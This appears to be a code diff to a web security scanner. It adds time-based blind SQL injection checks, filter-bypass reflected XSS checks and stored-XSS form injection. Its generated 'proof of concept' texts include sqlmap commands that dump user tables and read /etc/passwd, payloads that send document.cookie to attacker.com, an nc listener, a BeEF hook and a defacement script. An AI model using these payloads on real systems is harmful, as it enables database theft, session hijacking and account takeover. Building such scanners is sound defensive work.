@@ -3,7 +3,7 @@ import http from "http";
 import dns from "dns/promises";
 import { URL } from "url";
 import { validateSensitiveFile, validateSqlInjection, validateXssReflection } from "./response-validator.js";
-import { crawl, CrawlResult } from "./crawler.js";
+import { crawl, CrawlResult, FormInfo } from "./crawler.js";
 
 export interface ScanFinding {
   id: string;
@@ -34,6 +34,7 @@ export interface CrawlSummary {
   urls: string[];
   jsFiles: string[];
   errors: string[];
+  formsFound: number;
 }
 
 export interface ScanResult {
@@ -122,6 +123,58 @@ function fetchUrl(targetUrl: string, method = "GET", timeout = 10000): Promise<F
     });
 
     req.on("error", reject);
+    req.end();
+  });
+}
+
+/** POST variant of fetchUrl — sends a form-encoded or JSON body. */
+function fetchUrlPost(
+  targetUrl: string,
+  body: string,
+  contentType = "application/x-www-form-urlencoded",
+  timeout = 10000
+): Promise<FetchResult> {
+  return new Promise((resolve, reject) => {
+    const parsed = new URL(targetUrl);
+    const isHttps = parsed.protocol === "https:";
+    const lib = isHttps ? https : http;
+    const start = Date.now();
+
+    const bodyBuf = Buffer.from(body, "utf8");
+    const options: https.RequestOptions = {
+      method: "POST",
+      host: parsed.hostname,
+      port: parsed.port || (isHttps ? 443 : 80),
+      path: parsed.pathname + parsed.search,
+      headers: {
+        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+        "Content-Type": contentType,
+        "Content-Length": bodyBuf.length,
+        Accept: "text/html,application/xhtml+xml,*/*",
+      },
+      rejectUnauthorized: false,
+    };
+
+    const req = lib.request(options, (res) => {
+      let responseBody = "";
+      res.on("data", (chunk) => {
+        if (responseBody.length < 50_000) responseBody += chunk;
+      });
+      res.on("end", () => {
+        const headers: Record<string, string | string[] | undefined> = {};
+        for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;
+        resolve({
+          statusCode: res.statusCode ?? 0,
+          headers,
+          body: responseBody,
+          responseTimeMs: Date.now() - start,
+        });
+      });
+    });
+
+    req.setTimeout(timeout, () => { req.destroy(new Error("Request timed out")); });
+    req.on("error", reject);
+    req.write(bodyBuf);
     req.end();
   });
 }
@@ -1354,6 +1407,364 @@ nc -lvnp 80
   return findings;
 }
 
+// ── Advanced SQLi: Time-Based Blind Testing ───────────────────────────────────
+
+const SQLI_TIME_PAYLOADS: Array<{ db: string; payload: string }> = [
+  { db: "MySQL",      payload: `' OR SLEEP(5)--` },
+  { db: "MySQL",      payload: `" OR SLEEP(5)--` },
+  { db: "MySQL",      payload: `1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--` },
+  { db: "MSSQL",      payload: `'; WAITFOR DELAY '0:0:5'--` },
+  { db: "MSSQL",      payload: `1; WAITFOR DELAY '0:0:5'--` },
+  { db: "PostgreSQL", payload: `'; SELECT pg_sleep(5)--` },
+  { db: "PostgreSQL", payload: `' OR 1=1; SELECT pg_sleep(5)--` },
+  { db: "Oracle",     payload: `' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) IS NULL--` },
+];
+
+const DELAY_THRESHOLD_MS = 4500; // triggered SLEEP(5) = ~5s; flag at 4.5s to allow network variance
+const TIMING_TIMEOUT_MS  = 14_000; // generous enough for 5s DB sleep + 9s network overhead
+
+async function measureBaseline(url: string): Promise<number> {
+  try {
+    const r = await fetchUrl(url, "GET", 8000);
+    return Math.max(300, r.responseTimeMs); // floor at 300ms to avoid FPs on ultra-fast servers
+  } catch {
+    return 2000; // safe fallback for unreachable endpoints
+  }
+}
+
+async function checkSqliTimeBased(targetUrl: string): Promise<ScanFinding[]> {
+  const findings: ScanFinding[] = [];
+  const parsed = new URL(targetUrl);
+  const params = Array.from(parsed.searchParams.keys());
+  if (params.length === 0) return findings; // no-params case handled by error-based check
+
+  const baseline = await measureBaseline(targetUrl);
+
+  for (const param of params) {
+    let found = false;
+    for (const { db, payload } of SQLI_TIME_PAYLOADS) {
+      if (found) break;
+      try {
+        const testUrl = new URL(targetUrl);
+        testUrl.searchParams.set(param, payload);
+        const res = await fetchUrl(testUrl.toString(), "GET", TIMING_TIMEOUT_MS);
+        const elapsed = res.responseTimeMs;
+        const delay   = elapsed - baseline;
+
+        if (delay >= DELAY_THRESHOLD_MS) {
+          found = true;
+          const safeUrl = testUrl.toString();
+          findings.push({
+            id: `sqli-time-blind-${param}`,
+            category: "injection",
+            title: `SQL Injection — Time-Based Blind SQLi in Parameter "${param}" (${db})`,
+            severity: "critical",
+            status: "fail",
+            description: `The server delayed its response by ${delay}ms (baseline: ${baseline}ms) when a ${db} time-delay payload was injected into parameter "${param}". The database executed the SLEEP/WAITFOR/pg_sleep instruction, confirming the input reaches a SQL query without sanitisation. Because no error is visible, this is a Blind SQLi vulnerability — an attacker can silently enumerate the entire database by timing responses.`,
+            detail: `Vulnerable parameter: ${param}\nPayload: ${payload}\nDatabase type: ${db}\nBaseline response time: ${baseline}ms\nDelayed response time: ${elapsed}ms\nObserved delay: ${delay}ms (threshold: ${DELAY_THRESHOLD_MS}ms)`,
+            recommendation:
+              "1. Replace ALL raw SQL string concatenation with parameterised queries / prepared statements.\n" +
+              "2. Use an ORM (Drizzle, Prisma, Sequelize) — never build query strings by hand.\n" +
+              "3. Apply least-privilege DB accounts: read-only where writes are not required.\n" +
+              "4. Deploy a WAF with time-based SQLi signatures.\n" +
+              "5. Rate-limit endpoints — time-based attacks require many sequential requests.",
+            execution_poc:
+              `# ── Time-Based Blind SQLi — Reproduction & Exploitation ─────────────\n` +
+              `\n` +
+              `# Step 1: Confirm the 5-second delay manually (response takes ~5s)\n` +
+              `time curl -sk -o /dev/null "${safeUrl}"\n` +
+              `# Expected: ~5s real time — confirms SLEEP/WAITFOR triggered\n` +
+              `\n` +
+              `# Step 2: Automated database enumeration with sqlmap (time-based mode)\n` +
+              `sqlmap -u "${targetUrl}" \\\n` +
+              `  -p "${param}" \\\n` +
+              `  --technique=T \\\n` +
+              `  --dbms=${db.toLowerCase()} \\\n` +
+              `  --level=3 --risk=2 \\\n` +
+              `  --batch --dbs\n` +
+              `# Output: lists all databases accessible to the app DB user\n` +
+              `\n` +
+              `# Step 3: Enumerate tables in the application database\n` +
+              `sqlmap -u "${targetUrl}" \\\n` +
+              `  -p "${param}" --technique=T \\\n` +
+              `  -D app_database --tables --batch\n` +
+              `\n` +
+              `# Step 4: Dump credentials\n` +
+              `sqlmap -u "${targetUrl}" \\\n` +
+              `  -p "${param}" --technique=T \\\n` +
+              `  -D app_database -T users --dump --batch\n` +
+              `# Output: id | email | password_hash | role | ...\n` +
+              `# Crack hashes: https://crackstation.net  or  john --wordlist=rockyou.txt hashes.txt\n` +
+              `\n` +
+              `# Step 5: (MySQL) Read OS files if FILE privilege is granted\n` +
+              `sqlmap -u "${targetUrl}" \\\n` +
+              `  -p "${param}" --technique=T \\\n` +
+              `  --file-read="/etc/passwd" --batch`,
+          });
+        }
+      } catch {}
+    }
+  }
+  return findings;
+}
+
+// ── Advanced XSS: Obfuscated / Filter-Bypass Reflected Payloads ──────────────
+
+interface AdvXssCase {
+  name: string;
+  payload: string;
+  pattern: RegExp;
+}
+
+/** Payloads specifically chosen to bypass common string-based XSS filters. */
+const XSS_ADVANCED_CASES: AdvXssCase[] = [
+  {
+    name: "SVG self-closing, no space",
+    payload: `<svg/onload=alert(1)>`,
+    pattern: /<svg\/onload=alert\(1\)>/i,
+  },
+  {
+    name: "Mixed-case script tag",
+    payload: `<ScRiPt>alert(1)</ScRiPt>`,
+    pattern: /<ScRiPt>alert\(1\)<\/ScRiPt>/i,
+  },
+  {
+    name: "Attribute context — onmouseenter injection",
+    payload: `" onmouseenter="alert(1)`,
+    pattern: /onmouseenter="alert\(1\)/i,
+  },
+  {
+    name: "<details> ontoggle — unusual tag bypass",
+    payload: `<details open ontoggle=alert(1)>`,
+    pattern: /<details open ontoggle=alert\(1\)>/i,
+  },
+  {
+    name: "iframe javascript: URI",
+    payload: `<iframe src="javascript:alert(1)">`,
+    pattern: /<iframe src="javascript:alert\(1\)">/i,
+  },
+  {
+    name: "Input autofocus onfocus",
+    payload: `<input onfocus=alert(1) autofocus>`,
+    pattern: /<input onfocus=alert\(1\) autofocus>/i,
+  },
+  {
+    name: "Title-context break",
+    payload: `</title><script>alert(1)</script>`,
+    pattern: /<\/title><script>alert\(1\)<\/script>/i,
+  },
+  {
+    name: "img onerror — unquoted attribute",
+    payload: `<img src=x: onerror=alert(1)>`,
+    pattern: /<img src=x: onerror=alert\(1\)>/i,
+  },
+  {
+    name: "Body onpageshow event",
+    payload: `<body onpageshow=alert(1)>`,
+    pattern: /<body onpageshow=alert\(1\)>/i,
+  },
+  {
+    name: "Marquee onstart — legacy tag bypass",
+    payload: `<marquee onstart=alert(1)>`,
+    pattern: /<marquee onstart=alert\(1\)>/i,
+  },
+];
+
+async function checkXssReflectedAdvanced(targetUrl: string): Promise<ScanFinding[]> {
+  const findings: ScanFinding[] = [];
+  const parsed = new URL(targetUrl);
+  const params = Array.from(parsed.searchParams.keys());
+  if (params.length === 0) return findings;
+
+  for (const param of params) {
+    let found = false;
+    for (const { name, payload, pattern } of XSS_ADVANCED_CASES) {
+      if (found) break;
+      try {
+        const testUrl = new URL(targetUrl);
+        testUrl.searchParams.set(param, payload);
+        const res = await fetchUrl(testUrl.toString(), "GET", 7000);
+
+        const contentType = headerStr(res.headers["content-type"]) ?? "";
+        if (!contentType.includes("html")) continue;
+        if (!pattern.test(res.body)) continue;
+
+        const check = validateXssReflection(payload, res.body);
+        if (!check.isReal) continue;
+
+        found = true;
+        const match  = pattern.exec(res.body)!;
+        const start  = Math.max(0, match.index - 80);
+        const snippet = res.body.slice(start, start + 300);
+        const base   = targetUrl.replace(new URL(targetUrl).search, "");
+        const encPayload = encodeURIComponent(payload);
+
+        findings.push({
+          id: `xss-adv-reflected-${param}`,
+          category: "injection",
+          title: `Reflected XSS — Obfuscated Bypass in Parameter "${param}" (${name})`,
+          severity: "high",
+          status: "fail",
+          description:
+            `An obfuscated XSS payload using technique "${name}" was reflected verbatim in the HTML ` +
+            `response for parameter "${param}". This bypass method evades basic string-filter and ` +
+            `blacklist sanitisers. An attacker can craft a malicious link that, when opened by a victim, ` +
+            `executes arbitrary JavaScript — enabling cookie theft, session hijacking, and phishing overlays.`,
+          detail:
+            `Vulnerable parameter: ${param}\n` +
+            `Bypass technique: ${name}\n` +
+            `Payload: ${payload}\n` +
+            `Validator: ${check.reason}\n\n` +
+            `Reflected in response:\n...${snippet}...`,
+          recommendation:
+            "1. Use context-aware output encoding (HTML-encode <, >, &, \", ' before inserting into HTML).\n" +
+            "2. Never rely on blacklist-based sanitisation — obfuscated payloads are designed to bypass it.\n" +
+            "3. Implement a strict Content-Security-Policy: script-src 'self' 'nonce-{random}'.\n" +
+            "4. Validate and whitelist expected input formats server-side — reject inputs containing HTML metacharacters.\n" +
+            "5. Use a security-focused templating engine with auto-escape enabled (React JSX, Jinja2, etc.).",
+          execution_poc:
+            `# ── Reflected XSS Bypass — Verification ─────────────────────────────\n` +
+            `\n` +
+            `# Step 1: Open this URL in a browser — should trigger alert(1)\n` +
+            `# ${base}?${param}=${encPayload}\n` +
+            `\n` +
+            `# Step 2: Confirm unescaped reflection with curl\n` +
+            `curl -sk "${base}?${param}=${encPayload}" | grep -o '${payload.slice(0, 25)}.*'\n` +
+            `\n` +
+            `# Step 3: Steal session cookies (craft malicious link and send to victim)\n` +
+            `# Payload: <script>new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)</script>\n` +
+            `# Attacker listener:\n` +
+            `nc -lvnp 80\n` +
+            `# Receives: GET /c?x=session%3DABCDEF → use cookie to impersonate victim\n` +
+            `\n` +
+            `# Step 4: Inject BeEF hook for full browser control\n` +
+            `# ${base}?${param}=${encodeURIComponent('<script src="https://attacker.com:3000/hook.js"></script>')}\n` +
+            `# Victim's browser is hooked — attacker can screenshot, keylog, pivot network`,
+        });
+      } catch {}
+    }
+  }
+  return findings;
+}
+
+// ── Stored / Persistent XSS via Form Submission ───────────────────────────────
+
+async function checkStoredXss(forms: FormInfo[], baseOrigin: string): Promise<ScanFinding[]> {
+  const findings: ScanFinding[] = [];
+  const seen = new Set<string>();
+
+  // Only test POST forms that have named inputs
+  const postForms = forms.filter((f) => f.method === "POST" && f.inputs.length > 0);
+  if (postForms.length === 0) return findings;
+
+  for (const form of postForms.slice(0, 10)) { // cap to avoid scan timeout
+    // Unique probe — allows us to identify our injected content even after sanitisation attempts
+    const probe   = `xsstest${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
+    const payload = `<script>alert('${probe}')</script>`;
+
+    // Resolve action URL (relative → absolute)
+    let actionUrl: string;
+    try {
+      actionUrl = /^https?:\/\//i.test(form.action)
+        ? form.action
+        : new URL(form.action || "/", baseOrigin).href;
+    } catch {
+      continue;
+    }
+
+    // Build x-www-form-urlencoded body — inject payload into every input field
+    const formBody = form.inputs
+      .map((name) => `${encodeURIComponent(name)}=${encodeURIComponent(payload)}`)
+      .join("&");
+
+    try {
+      // 1. Submit the form
+      const postRes = await fetchUrlPost(actionUrl, formBody, "application/x-www-form-urlencoded", 10_000);
+
+      // 2. GET the action URL to check if the payload is now rendered/stored
+      const getRes = await fetchUrl(actionUrl, "GET", 8000).catch(() => null);
+
+      const checks: Array<{ label: string; body: string }> = [
+        { label: "POST response", body: postRes.body },
+        ...(getRes ? [{ label: "GET after POST", body: getRes.body }] : []),
+      ];
+
+      for (const { label, body } of checks) {
+        // Check if our unique probe appears in the response body unescaped
+        const probeIdx = body.indexOf(probe);
+        if (probeIdx < 0) continue;
+
+        // Verify the surrounding context is not HTML-entity-encoded
+        const ctx = body.slice(Math.max(0, probeIdx - 20), probeIdx + probe.length + 20);
+        if (ctx.includes("&lt;") || ctx.includes("%3C") || ctx.includes("&#")) continue;
+
+        const findingId = `xss-stored-${actionUrl.replace(/[^a-z0-9]/gi, "-").slice(0, 50)}`;
+        if (seen.has(findingId)) continue;
+        seen.add(findingId);
+
+        const snippetStart = Math.max(0, probeIdx - 80);
+        const snippet = body.slice(snippetStart, snippetStart + 320);
+
+        const curlFields = form.inputs
+          .map((n) => `--data-urlencode "${n}=<script>alert(document.domain)</script>"`)
+          .join(" \\\n  ");
+
+        findings.push({
+          id: findingId,
+          category: "injection",
+          title: `Stored XSS — Persistent Payload Found via Form POST to "${actionUrl}"`,
+          severity: "critical",
+          status: "fail",
+          description:
+            `A unique XSS probe submitted via POST to ${actionUrl} was found unescaped in the ` +
+            `${label} for input(s): ${form.inputs.join(", ")}. The application stores or echoes ` +
+            `user-supplied HTML/script content without sanitisation. Unlike Reflected XSS, Stored ` +
+            `XSS is Critical: every user who views this content automatically has JavaScript executed ` +
+            `in their browser — no phishing link required.`,
+          detail:
+            `Form action: ${actionUrl}\n` +
+            `Method: POST\n` +
+            `Vulnerable inputs: ${form.inputs.join(", ")}\n` +
+            `Unique probe: ${probe}\n` +
+            `Detected in: ${label}\n\n` +
+            `Response snippet:\n...${snippet}...`,
+          recommendation:
+            "1. HTML-encode ALL stored user content before rendering (replace <, >, &, \", ' with entities).\n" +
+            "2. Apply server-side sanitisation on write using a hardened library (DOMPurify, bleach).\n" +
+            "3. Enforce a strict Content-Security-Policy: script-src 'self' 'nonce-{value}'.\n" +
+            "4. Store content as plain text; parse as HTML only when needed, with an allowlist.\n" +
+            "5. Consider a Rich-Text editor that sanitises both client and server-side.",
+          execution_poc:
+            `# ── Stored XSS — Reproduction & Impact ──────────────────────────────\n` +
+            `\n` +
+            `# Step 1: Submit XSS payload via form POST\n` +
+            `curl -sk -X POST "${actionUrl}" \\\n` +
+            `  ${curlFields} \\\n` +
+            `  -H "Content-Type: application/x-www-form-urlencoded"\n` +
+            `\n` +
+            `# Step 2: Verify the payload is now stored — fetch the page\n` +
+            `curl -sk "${actionUrl}" | grep -i "alert\\|script\\|onerror"\n` +
+            `# If the unescaped payload appears → confirmed stored XSS\n` +
+            `\n` +
+            `# Step 3: Weaponise — exfiltrate ALL visitor cookies (persistent)\n` +
+            `# Inject: <script>new Image().src='https://attacker.com/c?x='+encodeURIComponent(document.cookie)</script>\n` +
+            `# Every visitor to this page sends their session cookie to the attacker\n` +
+            `\n` +
+            `# Step 4: Persistent account takeover\n` +
+            `# With stolen cookie:\n` +
+            `curl -sk -H "Cookie: session=STOLEN_VALUE" "${baseOrigin}/profile"\n` +
+            `# Or: DevTools > Application > Cookies > inject cookie > refresh\n` +
+            `\n` +
+            `# Step 5: Site-wide defacement / phishing overlay (affects ALL users)\n` +
+            `# Inject: <script>document.body.innerHTML='<h1>Hacked</h1><form action="https://attacker.com/">...'</script>`,
+        });
+        break; // one finding per form
+      }
+    } catch {}
+  }
+  return findings;
+}
+
 export async function runScan(targetUrl: string, crawlEnabled = false): Promise<ScanResult> {
   const parsed = new URL(targetUrl);
   const hostname = parsed.hostname;
@@ -1371,6 +1782,7 @@ export async function runScan(targetUrl: string, crawlEnabled = false): Promise<
       urls: crawlResult.urls,
       jsFiles: crawlResult.jsFiles,
       errors: crawlResult.errors,
+      formsFound: crawlResult.forms.length,
     };
   }
 
@@ -1401,9 +1813,12 @@ export async function runScan(targetUrl: string, crawlEnabled = false): Promise<
   const headerFindings = checkSecurityHeaders(mainFetch.headers);
   const serverFindings = checkServerInfo(mainFetch.headers);
 
-  // ── Crawl-mode: run injection checks on every discovered URL with params ──
-  const extraSqliFindings: ScanFinding[] = [];
-  const extraXssFindings: ScanFinding[] = [];
+  // ── Crawl-mode: run all injection checks on every discovered URL with params ──
+  const extraSqliFindings:     ScanFinding[] = [];
+  const extraSqliTimeFindings: ScanFinding[] = [];
+  const extraXssFindings:      ScanFinding[] = [];
+  const extraXssAdvFindings:   ScanFinding[] = [];
+  const storedXssFindings:     ScanFinding[] = [];
 
   if (crawlResult && crawlResult.urlsWithParams.length > 0) {
     // Skip the root URL itself (already tested above), cap at 50 targets
@@ -1418,13 +1833,15 @@ export async function runScan(targetUrl: string, crawlEnabled = false): Promise<
     for (let i = 0; i < additionalTargets.length; i += BATCH) {
       const batch = additionalTargets.slice(i, i + BATCH);
 
-      // For each URL in the batch, run SQLi + XSS in parallel
+      // For each URL: error-based SQLi + time-based SQLi + basic XSS + advanced XSS — all parallel
       const perUrlResults = await Promise.all(
         batch.map(async (srcUrl, batchIdx) => {
           const urlIdx = i + batchIdx;
-          const [sqli, xss] = await Promise.all([
+          const [sqli, sqliTime, xss, xssAdv] = await Promise.all([
             checkSqlInjection(srcUrl),
+            checkSqliTimeBased(srcUrl),
             checkXss(srcUrl),
+            checkXssReflectedAdvanced(srcUrl),
           ]);
 
           // Tag findings with source URL + unique id suffix; keep only failures
@@ -1445,15 +1862,28 @@ export async function runScan(targetUrl: string, crawlEnabled = false): Promise<
                 return true;
               });
 
-          return { sqli: tag(sqli), xss: tag(xss) };
+          return {
+            sqli:     tag(sqli),
+            sqliTime: tag(sqliTime),
+            xss:      tag(xss),
+            xssAdv:   tag(xssAdv),
+          };
         })
       );
 
       for (const r of perUrlResults) {
         extraSqliFindings.push(...r.sqli);
+        extraSqliTimeFindings.push(...r.sqliTime);
         extraXssFindings.push(...r.xss);
+        extraXssAdvFindings.push(...r.xssAdv);
       }
     }
+  }
+
+  // ── Stored XSS: POST discovered forms with XSS probes ────────────────────
+  if (crawlResult && crawlResult.forms.length > 0) {
+    const sf = await checkStoredXss(crawlResult.forms, targetUrl);
+    storedXssFindings.push(...sf);
   }
 
   const allFindings = [
@@ -1467,7 +1897,10 @@ export async function runScan(targetUrl: string, crawlEnabled = false): Promise<
     ...sqliFindings,
     ...xssFindings,
     ...extraSqliFindings,
+    ...extraSqliTimeFindings,
     ...extraXssFindings,
+    ...extraXssAdvFindings,
+    ...storedXssFindings,
   ];
 
   const summary: ScanSummary = {
